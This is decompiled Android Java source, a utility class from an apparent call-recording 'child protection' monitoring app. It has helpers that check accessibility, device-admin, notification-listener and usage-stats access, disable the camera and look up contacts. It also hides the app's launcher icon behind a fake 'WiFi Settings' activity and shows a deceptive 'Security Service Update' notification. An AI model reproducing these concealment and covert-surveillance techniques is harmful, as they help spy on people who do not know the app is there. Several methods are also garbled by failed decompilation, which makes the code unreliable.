package com.yasoka.spcallrecord.recorder.call.a.c.j;

import a.b.a.a.a;
import a.c.e.e;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.AppOpsManager;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.graphics.BitmapFactory.Options;
import android.media.AudioRecord;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.PowerManager;
import android.provider.ContactsContract.PhoneLookup;
import android.provider.Settings.Secure;
import android.provider.Settings.SettingNotFoundException;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.text.TextUtils.SimpleStringSplitter;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.core.content.ContextCompat;
import com.app.received.PolicyActivate;
import com.crashlytics.android.Crashlytics;
import com.google.android.gms.tasks.C0500c;
import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.security.MessageDigest;
import java.text.DecimalFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import mob.protect.children.R;

/* compiled from: PictureUtil */
public class c {
    public static void a(File file, File file2) {
        try {
            Options options = new Options();
            int i = 1;
            options.inJustDecodeBounds = true;
            FileInputStream fileInputStream = new FileInputStream(file);
            BitmapFactory.decodeStream(fileInputStream, null, options);
            if (options.outHeight > 800 || options.outWidth > 800) {
                double max = (double) Math.max(options.outHeight, options.outWidth);
                Double.isNaN(max);
                i = (int) Math.pow(2.0d, (double) ((int) Math.round(Math.log(800.0d / max) / Math.log(0.5d))));
            }
            Options options2 = new Options();
            options2.inSampleSize = i;
            FileInputStream fileInputStream2 = new FileInputStream(file);
            Bitmap decodeStream = BitmapFactory.decodeStream(fileInputStream2, null, options2);
            if (decodeStream != null) {
                ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
                decodeStream.compress(CompressFormat.JPEG, 100, byteArrayOutputStream);
                byte[] byteArray = byteArrayOutputStream.toByteArray();
                BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(new FileOutputStream(file2));
                bufferedOutputStream.write(byteArray);
                bufferedOutputStream.flush();
                bufferedOutputStream.close();
            } else {
                b(file, file2);
            }
            fileInputStream2.close();
            fileInputStream.close();
            return;
        } catch (Throwable th) {
            th.printStackTrace();
        }
        th.getStackTrace();
    }

    private static void b(File file, File file2) throws Throwable {
        FileInputStream fileInputStream = new FileInputStream(file);
        FileOutputStream fileOutputStream = new FileOutputStream(file2);
        byte[] bArr = new byte[1024];
        while (true) {
            int read = fileInputStream.read(bArr);
            if (read > 0) {
                fileOutputStream.write(bArr, 0, read);
            } else {
                fileInputStream.close();
                fileOutputStream.close();
                return;
            }
        }
    }

    public static String c() {
        try {
            return new SimpleDateFormat("yyyy/MM/dd HH:mm", Locale.US).format(new Date());
        } catch (Throwable th) {
            th.getStackTrace();
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
            return "";
        }
    }

    public static SimpleDateFormat d() {
        return new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US);
    }

    public static boolean e(Context context) {
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
            if (connectivityManager != null) {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                if (activeNetworkInfo != null) {
                    return activeNetworkInfo.isConnected();
                }
            }
            return false;
        } catch (Exception e2) {
            e2.getStackTrace();
            return false;
        }
    }

    public static boolean f() {
        AudioRecord audioRecord;
        Boolean valueOf = Boolean.valueOf(true);
        try {
            audioRecord = new AudioRecord(1, 44100, 16, 1, 44100);
            if (audioRecord.getRecordingState() != 1) {
                valueOf = Boolean.valueOf(false);
            }
            audioRecord.startRecording();
            if (audioRecord.getRecordingState() != 3) {
                audioRecord.stop();
                valueOf = Boolean.valueOf(false);
            }
            audioRecord.stop();
            audioRecord.release();
        } catch (Exception e2) {
            e2.getStackTrace();
        } catch (Throwable th) {
            audioRecord.release();
            throw th;
        }
        return valueOf.booleanValue();
    }

    public static boolean g(Context context) {
        int i;
        try {
            StringBuilder sb = new StringBuilder();
            sb.append(context.getPackageName());
            sb.append("/");
            sb.append("com.app");
            sb.append(".service.AccessService");
            String sb2 = sb.toString();
            try {
                i = Secure.getInt(context.getContentResolver(), "accessibility_enabled");
            } catch (SettingNotFoundException e2) {
                e2.getStackTrace();
                i = 0;
            }
            if (i == 1) {
                String string = Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
                if (string != null) {
                    SimpleStringSplitter simpleStringSplitter = new SimpleStringSplitter(':');
                    simpleStringSplitter.setString(string);
                    while (simpleStringSplitter.hasNext()) {
                        if (simpleStringSplitter.next().equalsIgnoreCase(sb2)) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception e3) {
            e3.getStackTrace();
        }
        return false;
    }

    public static boolean h(Context context) {
        try {
            PolicyActivate policyActivate = new PolicyActivate(context);
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
            ComponentName a2 = policyActivate.a();
            if (!(devicePolicyManager == null || devicePolicyManager.getActiveAdmins() == null || !devicePolicyManager.isAdminActive(a2))) {
                return devicePolicyManager.getCameraDisabled(a2);
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return true;
    }

    public static String i(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
        } catch (NameNotFoundException e2) {
            e2.getStackTrace();
            return "150";
        }
    }

    @RequiresApi(api = 21)
    public static boolean j(Context context) {
        try {
            ApplicationInfo applicationInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0);
            AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService("appops");
            if ((appOpsManager != null ? appOpsManager.checkOpNoThrow("android:get_usage_stats", applicationInfo.uid, applicationInfo.packageName) : 0) == 0) {
                return true;
            }
            return false;
        } catch (Exception unused) {
            return false;
        }
    }

    public static boolean k(Context context) {
        try {
            if (VERSION.SDK_INT >= 21) {
                PowerManager powerManager = (PowerManager) context.getSystemService("power");
                if (powerManager != null && powerManager.isInteractive() && !m(context)) {
                    return true;
                }
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return false;
    }

    public static boolean l(Context context) {
        try {
            WifiManager wifiManager = (WifiManager) context.getApplicationContext().getSystemService("wifi");
            if (wifiManager != null && wifiManager.isWifiEnabled()) {
                return true;
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return false;
    }

    public static boolean m(Context context) {
        try {
            KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService("keyguard");
            if (keyguardManager != null && keyguardManager.isKeyguardLocked()) {
                return true;
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return false;
    }

    public static boolean n(Context context) {
        try {
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService("connectivity");
            if (connectivityManager != null) {
                NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
                if (activeNetworkInfo != null) {
                    return activeNetworkInfo.isConnected();
                }
                return false;
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
        return true;
    }

    public static void o(Context context) {
        new PolicyActivate(context).b();
        String packageName = context.getPackageName();
        Intent intent = new Intent("android.intent.action.UNINSTALL_PACKAGE");
        StringBuilder sb = new StringBuilder();
        sb.append("package:");
        sb.append(packageName);
        intent.setData(Uri.parse(sb.toString()));
        intent.putExtra("android.intent.extra.RETURN_RESULT", true);
        context.startActivity(intent);
    }

    public static void d(Context context) {
        try {
            a.d.a.b.b.c.a(context).f().a((C0500c<TResult>) new d<TResult>(context));
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    /* JADX WARNING: Code restructure failed: missing block: B:7:0x001d, code lost:
        if (r0.toLowerCase().contains("xiaomi") != false) goto L_0x001f;
     */
    public static boolean e() {
        int i = VERSION.SDK_INT;
        if (i >= 21) {
            if (i > 28) {
                String str = Build.MANUFACTURER;
                if (!TextUtils.isEmpty(str)) {
                }
            }
            return true;
        }
        return false;
    }

    public static String c(String str) {
        try {
            MessageDigest instance = MessageDigest.getInstance("MD5");
            instance.reset();
            instance.update(str.getBytes());
            byte[] digest = instance.digest();
            int length = digest.length;
            StringBuilder sb = new StringBuilder(length << 1);
            for (int i = 0; i < length; i++) {
                sb.append(Character.forDigit((digest[i] & 240) >> 4, 16));
                sb.append(Character.forDigit(digest[i] & 15, 16));
            }
            return sb.toString();
        } catch (Throwable th) {
            th.getMessage();
            return str;
        }
    }

    public static String b() {
        try {
            return new SimpleDateFormat("yyyy/MM/dd HH:mm:ss", Locale.US).format(new Date());
        } catch (Throwable th) {
            th.getStackTrace();
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
            return "";
        }
    }

    public static String b(String str) {
        try {
            String substring = str.substring(str.lastIndexOf("."), str.length());
            StringBuilder sb = new StringBuilder();
            sb.append("File ");
            sb.append(str);
            sb.append(" has extension ");
            sb.append(substring);
            sb.toString();
            return substring;
        } catch (Exception e2) {
            e2.getStackTrace();
            return "";
        }
    }

    public static boolean f(Context context) {
        try {
            if (NotificationManagerCompat.getEnabledListenerPackages(context).contains(context.getPackageName())) {
                return true;
            }
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
        return false;
    }

    public static void b(Context context) {
        AlertDialog create = new Builder(context).create();
        create.setTitle(context.getResources().getString(R.string.action_info));
        create.setIcon(ContextCompat.getDrawable(context, R.mipmap.ic_logo_app));
        create.setCancelable(false);
        StringBuilder sb = new StringBuilder();
        StringBuilder a2 = a.a("Email: ");
        a2.append(context.getSharedPreferences("user", 0).getString(NotificationCompat.CATEGORY_EMAIL, ""));
        sb.append(a2.toString());
        sb.append("\n\n");
        StringBuilder sb2 = new StringBuilder();
        sb2.append("Token: ");
        sb2.append(e.w(context));
        sb.append(sb2.toString());
        create.setMessage(sb.toString());
        create.setButton(-1, "OK", new h());
        create.show();
    }

    public static String c(Context context) {
        String str;
        String str2 = null;
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService("phone");
            if (telephonyManager != null) {
                String simCountryIso = telephonyManager.getSimCountryIso();
                if (simCountryIso != null && simCountryIso.length() == 2) {
                    return simCountryIso.toLowerCase();
                }
                String networkCountryIso = telephonyManager.getNetworkCountryIso();
                if (networkCountryIso != null && networkCountryIso.length() == 2) {
                    return networkCountryIso.toLowerCase();
                }
            }
            if (VERSION.SDK_INT >= 24) {
                str = context.getResources().getConfiguration().getLocales().get(0).getCountry();
            } else {
                str = context.getResources().getConfiguration().locale.getCountry();
            }
            str2 = str;
            if (str2 != null && str2.length() == 2) {
                return str2.toLowerCase();
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return str2;
    }

    public static void a(AppCompatActivity appCompatActivity) {
        if (e(appCompatActivity.getApplicationContext())) {
            appCompatActivity.runOnUiThread(new e(appCompatActivity));
        } else {
            appCompatActivity.runOnUiThread(new f(appCompatActivity));
        }
    }

    public static void a(String str, Context context) {
        try {
            AlertDialog create = new Builder(context).create();
            create.setMessage(str);
            create.setCancelable(false);
            create.setButton(-1, context.getString(17039370), new g());
            create.show();
        } catch (Exception e2) {
            e2.getStackTrace();
            try {
                e2.getStackTrace();
                Crashlytics.logException(e2);
            } catch (Exception unused) {
            }
        }
    }

    public static String a() {
        try {
            return new SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.US).format(new Date());
        } catch (Throwable th) {
            try {
                th.getStackTrace();
                Crashlytics.logException(th);
            } catch (Exception unused) {
            }
            return "";
        }
    }

    public static String a(String str) {
        String str2 = "http://";
        try {
            if (!str.startsWith(str2) && !str.startsWith("https://")) {
                StringBuilder sb = new StringBuilder();
                sb.append(str2);
                sb.append(str);
                str = sb.toString();
            }
            String host = new URI(str).getHost();
            if (host.startsWith("www.")) {
                host = host.substring(4);
            }
            return host;
        } catch (Throwable th) {
            th.printStackTrace();
            return str;
        }
    }

    public static String a(Context context, String str) {
        try {
            Cursor query = context.getContentResolver().query(Uri.withAppendedPath(PhoneLookup.CONTENT_FILTER_URI, Uri.encode(str)), new String[]{"display_name"}, null, null, null);
            if (query != null) {
                if (query.moveToFirst() && query.getString(0) != null) {
                    str = query.getString(0);
                }
                query.close();
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return str;
    }

    public static String a(long j) {
        if (j <= 0) {
            return "0";
        }
        String[] strArr = {"B", "kB", "MB", "GB", "TB"};
        double d2 = (double) j;
        int log10 = (int) (Math.log10(d2) / Math.log10(1024.0d));
        StringBuilder sb = new StringBuilder();
        DecimalFormat decimalFormat = new DecimalFormat("#,##0.#");
        double pow = Math.pow(1024.0d, (double) log10);
        Double.isNaN(d2);
        sb.append(decimalFormat.format(d2 / pow));
        sb.append(" ");
        sb.append(strArr[log10]);
        return sb.toString();
    }

    /* JADX WARNING: Can't wrap try/catch for region: R(6:9|10|11|12|13|15) */
    /* JADX WARNING: Failed to process nested try/catch */
    /* JADX WARNING: Missing exception handler attribute for start block: B:11:0x001e */
    /* JADX WARNING: Removed duplicated region for block: B:22:0x002f A[SYNTHETIC, Splitter:B:22:0x002f] */
    /* JADX WARNING: Removed duplicated region for block: B:26:0x0036 A[SYNTHETIC, Splitter:B:26:0x0036] */
    public static byte[] a(File file) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream;
        InputStream inputStream = null;
        try {
            byte[] bArr = new byte[4096];
            byteArrayOutputStream = new ByteArrayOutputStream();
            try {
                FileInputStream fileInputStream = new FileInputStream(file);
                while (true) {
                    try {
                        int read = fileInputStream.read(bArr);
                        if (read != -1) {
                            byteArrayOutputStream.write(bArr, 0, read);
                        } else {
                            byteArrayOutputStream.close();
                            fileInputStream.close();
                            return byteArrayOutputStream.toByteArray();
                        }
                    } catch (Throwable th) {
                        th = th;
                        inputStream = fileInputStream;
                        if (byteArrayOutputStream != null) {
                            try {
                                byteArrayOutputStream.close();
                            } catch (IOException unused) {
                            }
                        }
                        if (inputStream != null) {
                            try {
                                inputStream.close();
                            } catch (IOException unused2) {
                            }
                        }
                        throw th;
                    }
                }
            } catch (Throwable th2) {
                th = th2;
                if (byteArrayOutputStream != null) {
                }
                if (inputStream != null) {
                }
                throw th;
            }
        } catch (Throwable th3) {
            th = th3;
            byteArrayOutputStream = null;
            if (byteArrayOutputStream != null) {
            }
            if (inputStream != null) {
            }
            throw th;
        }
    }

    public static boolean a(File file, Context context) {
        if (file == null || (file.length() / 1024) / 1024 >= ((long) context.getSharedPreferences("user", 0).getInt("sizeCallLimit", 60))) {
            return false;
        }
        return true;
    }

    public static Notification a(Context context) {
        String str = "Security Service Update";
        if (VERSION.SDK_INT >= 26) {
            NotificationManager notificationManager = (NotificationManager) context.getSystemService("notification");
            NotificationChannel notificationChannel = new NotificationChannel(str, "Security Service", 3);
            if (notificationManager != null) {
                notificationManager.createNotificationChannel(notificationChannel);
            }
        }
        return new NotificationCompat.Builder(context, str).setSmallIcon(R.drawable.ic_notif).setContentTitle("Update Security Service").setContentText("Update progress...").setPriority(1).build();
    }

    public static boolean a(Context context, boolean z) {
        try {
            PolicyActivate policyActivate = new PolicyActivate(context);
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) context.getSystemService("device_policy");
            ComponentName a2 = policyActivate.a();
            if (!(devicePolicyManager == null || devicePolicyManager.getActiveAdmins() == null || !devicePolicyManager.isAdminActive(a2))) {
                devicePolicyManager.setCameraDisabled(a2, z);
                return true;
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        return false;
    }

    public static void a(boolean z, Context context) {
        String str = Build.MANUFACTURER;
        boolean z2 = false;
        try {
            if (!TextUtils.isEmpty(str) && str.toLowerCase().contains("xiaomi")) {
                z2 = true;
            }
        } catch (Exception e2) {
            e2.getStackTrace();
        }
        String str2 = "com.app.activity.ActivitySettingsWifiSettings";
        String str3 = "com.app.activity.FirstActivity";
        if (z) {
            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context.getPackageName(), str3), 1, 1);
            if (VERSION.SDK_INT >= 29 && !z2) {
                context.getPackageManager().setComponentEnabledSetting(new ComponentName(context.getPackageName(), str2), 2, 1);
                return;
            }
            return;
        }
        context.getPackageManager().setComponentEnabledSetting(new ComponentName(context.getPackageName(), str3), 2, 1);
        if (VERSION.SDK_INT >= 29 && !z2) {
            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context.getPackageName(), str2), 1, 1);
        }
    }
}
